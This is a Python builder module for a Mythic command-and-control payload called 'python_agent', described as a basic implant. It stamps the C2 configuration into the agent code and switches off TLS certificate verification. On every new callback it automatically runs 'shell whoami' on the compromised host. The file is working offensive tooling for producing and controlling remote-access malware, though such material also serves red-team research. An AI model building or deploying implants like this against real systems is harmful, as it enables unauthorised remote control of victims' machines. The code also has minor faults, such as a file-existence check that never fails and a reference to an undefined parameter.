from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import json
import os
import pathlib


class PythonAgent(PayloadType):
    name = "python_agent"  # NEEDS TO BE THE SAME AS THE DIRECTORY THE AGENT IS IN
    file_extension = "py"
    author = "@maximedelis"
    supported_os = [SupportedOS.Linux, SupportedOS.MacOS, SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = """Basic Implant in Python"""
    supports_dynamic_loading = False
    c2_profiles = ["http"]
    mythic_encrypts = True
    translation_container = None
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format (lol)",
            choices=["py"],
            default_value="py"
        )
    ]
    agent_path = pathlib.Path(".") / "python_agent"
    agent_icon_path = agent_path / "agent_functions" / "bug.svg"
    agent_code_path = agent_path / "agent_code"

    build_steps = [  # Build steps
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Configuring", step_description="Stamping in configuration values"),
        BuildStep(step_name="Compiling", step_description="Compiling the agent...")
    ]

    async def build(self) -> BuildResponse:  # Build function called when an agent is generated
        resp = BuildResponse(status=BuildStatus.Success)
        build_msg = ""

        try:
            command_code = ""
            for cmd in self.commands.get_commands():
                command_path = os.path.join(self.agent_code_path, cmd + ".py")
                if not command_path:
                    build_msg += "{} command not available for {}.\n".format(cmd, self.get_parameter("python_version"))
                else:
                    command_code += (
                            open(command_path, "r").read() + "\n"
                    )
            base_code = open(os.path.join(self.agent_code_path, "main_agent.py"), "r").read()

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))

            base_code = base_code.replace("UUID_HERE", self.uuid)
            base_code = base_code.replace("#COMMANDS_HERE", command_code)

            for c2 in self.c2info:
                profile = c2.get_c2profile()["name"]

                for key, val in c2.get_parameters_dict().items():
                    if not isinstance(val, str):
                        base_code = base_code.replace(key, json.dumps(val).replace("false", "False").replace("true",
                                                                                                             "True").replace(
                            "null", "None")
                                                      )
                    else:
                        base_code = base_code.replace(key, val)

            base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
            base_code = base_code.replace("#CERTSKIP",
                """
        gcontext = ssl.create_default_context()
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE\n""")

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configuring",
                StepStdout="Configuration complete",
                StepSuccess=True
            ))

            if build_msg != "":
                resp.build_stderr = build_msg
                resp.set_status(BuildStatus.Error)

            resp.payload = base_code.encode()
            resp.build_message = "Successfully built!"

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Compiling",
                StepStdout="Compilation complete",
                StepSuccess=True
            ))

        except Exception as e:
            resp.build_stderr = str(e)
            resp.status = BuildStatus.Error
            return resp

        return resp

    # Automatically called when a new callback is received
    async def on_new_callback(self, newCallback: PTOnNewCallbackAllData) -> PTOnNewCallbackResponse:
        new_task_resp = await SendMythicRPCTaskCreate(MythicRPCTaskCreateMessage(
            AgentCallbackID=newCallback.Callback.AgentCallbackID,
            CommandName="shell",
            Params="whoami",
        ))
        if new_task_resp.Success:
            return PTOnNewCallbackResponse(AgentCallbackID=newCallback.Callback.AgentCallbackID, Success=True)
        return PTOnNewCallbackResponse(AgentCallbackID=newCallback.Callback.AgentCallbackID, Success=False,
                                       Error=new_task_resp.Error)
